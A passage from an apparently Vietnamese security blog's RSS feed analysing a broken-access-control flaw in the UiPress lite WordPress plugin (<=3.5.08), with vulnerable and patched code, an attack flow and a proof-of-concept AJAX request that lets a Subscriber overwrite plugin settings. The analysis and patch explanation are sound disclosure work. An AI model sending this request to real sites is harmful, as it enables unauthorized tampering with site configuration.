0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.09&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω m·ªôt danh s√°ch d√†i c√°c AJAX:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;      &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;      &amp;#34;uip_get_post_types&amp;#34;,&#xA;      &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;      &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;      &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;      &amp;#34;uip_delete_post&amp;#34;,&#xA;      &amp;#34;uip_save_user_preference&amp;#34;,&#xA;      &amp;#34;uip_get_user_preference&amp;#34;,&#xA;      &amp;#34;uip_search_content&amp;#34;,&#xA;      &amp;#34;uip_process_form_input&amp;#34;,&#xA;      &amp;#34;uip_send_form_email&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;      &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;      &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;      &amp;#34;uip_get_sync_options&amp;#34;,&#xA;      &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;      &amp;#34;uip_save_sync_options&amp;#34;,&#xA;      &amp;#34;uip_start_site_sync&amp;#34;,&#xA;      &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;      &amp;#34;uip_process_block_query&amp;#34;,&#xA;      &amp;#34;uip_save_site_option&amp;#34;,&#xA;      &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;      &amp;#34;uip_global_export&amp;#34;,&#xA;      &amp;#34;uip_global_import&amp;#34;,&#xA;      &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;      &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    foreach ($function_names as $name) {&#xA;      add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·ªÅn t·ªë &lt;code&gt;wp_ajax_&lt;/code&gt; cho bi·∫øt c√°c AJAX n√†y ch·ªâ ch·∫°y v·ªõi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;p&gt;·ªû b·∫£n l·ªói &lt;strong&gt;v3.5.08&lt;/strong&gt;, to√†n b·ªô callback ƒë·ªÅu kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng. V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_save_site_option()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    $option = json_decode(stripslashes($_POST[&amp;#34;option&amp;#34;]));&#xA;    $option = Sanitize::clean_input_with_code($option);&#xA;    $optionName = sanitize_text_field($_POST[&amp;#34;optionName&amp;#34;]);&#xA;&#xA;    if (!$optionName) {&#xA;      Ajax::error(__(&amp;#34;No option name specified&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    UipOptions::update($optionName, $option);&#xA;&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    $returndata[&amp;#34;message&amp;#34;] = __(&amp;#34;Option saved&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y th·ª±c hi·ªán update option &lt;code&gt;uip-global-settings&lt;/code&gt; trong database v·ªõi c√°c gi√° tr·ªã &lt;code&gt;option&lt;/code&gt; v√† &lt;code&gt;optionName&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ POST request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function update($key = null, $newValue = false)&#xA;{&#xA;    $options = get_option(&amp;#34;uip-global-settings&amp;#34;);&#xA;    $options = $options ? $options : [];&#xA;&#xA;    if (isset($key)) {&#xA;        $options[$key] = $newValue;&#xA;    } else {&#xA;        $options = $newValue;&#xA;    }&#xA;&#xA;    update_option(&amp;#34;uip-global-settings&amp;#34;, $options);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Option n√†y ƒë∆∞·ª£c l∆∞u trong b·∫£ng &lt;code&gt;wp_options&lt;/code&gt; v·ªõi &lt;code&gt;option_name&lt;/code&gt; l√† &lt;code&gt;uip-global-settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;M·∫∑c d√π &lt;code&gt;Ajax::check_referer()&lt;/code&gt; ki·ªÉm tra CSRF b·∫±ng &lt;code&gt;security&lt;/code&gt; nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer;&#xA;&#xA;    if (!$result) {&#xA;        self::error(__(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nonce n√†y xu·∫•t hi·ªán trong Dashboard c·ªßa m·ªçi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p, k·ªÉ c·∫£ Subscriber. Tuy nhi√™n c√°c h√†nh ƒë·ªông AJAX th·ª±c t·∫ø ch·ªâ d√†nh cho admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#34; title=&#34;Nonce trong admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;215&#34; width=&#34;838&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû b·∫£n v√° &lt;strong&gt;v3.5.09&lt;/strong&gt;, nh√† ph√°t tri·ªÉn ƒë√£ b·ªï sung ki·ªÉm tra quy·ªÅn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    if (!current_user_can(&amp;#34;manage_options&amp;#34;)) {&#xA;      Ajax::error(__(&amp;#34;You do not have permission to perform this action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; l√† quy·ªÅn thu·ªôc v·ªÅ admin, n√™n ch·ªâ admin m·ªõi c√≥ th·ªÉ th·ª±c thi c√°c AJAX n√†y.&lt;/p&gt;&#xA;&lt;p&gt;To√†n b·ªô c√°c callback AJAX ƒëƒÉng k√Ω ·ªü tr√™n ƒë·ªÅu ƒë∆∞·ª£c √°p d·ª•ng c√πng c∆° ch·∫ø ki·ªÉm tra trong b·∫£n v√°.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Dashboard renders ‚Üí &amp;#39;uip-security-nonce&amp;#39; is available to all logged-in users&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Attacker sends AJAX request: action=uip_save_site_option&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Hook triggered: wp_ajax_uip_save_site_option&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Ajax::check_referer() validates nonce ‚Äî passes&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;No capability check is performed&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;uip_save_site_option() executes&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Reads POST parameters: optionName &amp;#43; option&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;Calls UipOptions::update()&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;uip-global-settings&amp;#39;, attacker-controlled data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Plugin settings overwritten by a low-privileged user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng Subcriber account&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y nonce t·ª´ admin Dashboard&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subcriber&amp;#43;_cookie&#xA;&#xA;action=uip_save_site_option&amp;amp;security=e032057458&amp;amp;option={payload}&amp;amp;optionName=remote-sync&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;--- Before&#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&#xA;&#xA;-- After &#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;O:8:&amp;#34;stdClass&amp;#34;:0:{}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Error x·∫£y ra&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#34; title=&#34;Error x·∫£y ra khi option thay ƒë·ªïi&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/err.png&#34; data-sub-html=&#34;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;Error x·∫£y ra khi option thay ƒë·ªïi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#39; alt=&#34;Error&#34; height=&#34;347&#34; width=&#34;1252&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Error x·∫£y ra khi option thay ƒë·ªïi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong UiPress lite &amp;lt;= 3.5.08 xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu ki·ªÉm tra quy·ªÅn trong c√°c AJAX callback d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p, ƒë·∫∑c bi·ªát l√† h√†m &lt;code&gt;uip_save_site_option()&lt;/code&gt;. M·∫∑c d√π plugin c√≥ ki·ªÉm tra CSRF b·∫±ng nonce, nonce n√†y l·∫°i ƒë∆∞·ª£c cung c·∫•p cho m·ªçi ng∆∞·ªùi d√πng, bao g·ªìm c·∫£ Subscriber. ƒêi·ªÅu n√†y cho ph√©p b·∫•t k·ª≥ t√†i kho·∫£n c√≥ quy·ªÅn th·∫•p n√†o c≈©ng c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp c√°c h√†nh ƒë·ªông AJAX ƒë·∫∑c quy·ªÅn v√† ghi ƒë√® c√°c thi·∫øt l·∫≠p quan tr·ªçng c·ªßa plugin trong &lt;code&gt;uip-global-settings&lt;/code&gt;. ƒê√¢y l√† m·ªôt l·ªói Broken Access Control cho ph√©p ng∆∞·ªùi d√πng quy·ªÅn th·∫•p s·ª≠a ƒë·ªïi d·ªØ li·ªáu ch·ªâ d√†nh cho admin. B·∫£n v√° 3.5.09 kh·∫Øc ph·ª•c b·∫±ng c√°ch th√™m ki·ªÉm tra &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSRF nonce kh√¥ng ƒë·ªß an to√†n&lt;/strong&gt; n·∫øu thi·∫øu ki·ªÉm tra quy·ªÅn cho h√†nh ƒë·ªông ƒë∆∞·ª£c th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªçi AJAX ƒë·∫∑c quy·ªÅn ph·∫£i ki·ªÉm tra capability&lt;/strong&gt; tr∆∞·ªõc khi x·ª≠ l√Ω d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce hi·ªÉn th·ªã cho m·ªçi user&lt;/strong&gt; c√≥ th·ªÉ d·∫´n ƒë·∫øn l·∫°m d·ª•ng khi k·∫øt h·ª£p v·ªõi thi·∫øu ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;T√†i kho·∫£n quy·ªÅn th·∫•p kh√¥ng bao gi·ªù ƒë∆∞·ª£c ph√©p ch·ªânh s·ª≠a thi·∫øt l·∫≠p admin&lt;/strong&gt;, d√π qua AJAX hay b·∫•t k·ª≥ c∆° ch·∫ø n√†o kh√°c.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce + capability check lu√¥n ph·∫£i ƒëi k√®m nhau&lt;/strong&gt; ƒë·ªÉ tr√°nh CSRF v√† l·ªói leo thang ƒë·∫∑c quy·ªÅn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-08-missing-authorization-to-authenticated-subscriber-plugin-settings-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.08 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64384 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-09-cve-2025-64384/</link>
      <pubDate>Tue, 09 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-09-cve-2025-64384/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Missing Authorization&lt;/strong&gt; trong &lt;strong&gt;jetmonsters JetFormBuilder&lt;/strong&gt; &lt;strong&gt;jetformbuilder&lt;/strong&gt; cho ph√©p khai th√°c 